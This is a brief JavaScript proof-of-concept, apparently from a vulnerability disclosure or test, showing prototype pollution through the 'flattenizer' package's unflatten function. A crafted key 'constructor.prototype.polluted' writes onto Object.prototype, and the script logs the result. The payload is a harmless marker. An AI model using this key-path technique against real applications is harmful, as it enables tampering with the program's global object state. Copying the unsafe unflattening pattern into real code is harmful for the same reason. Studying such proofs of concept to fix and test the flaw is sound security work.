var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
const flattenizer = require('flattenizer');
flattenizer.unflatten({ 'constructor.prototype.polluted': 'yes' });
console.log({}.polluted);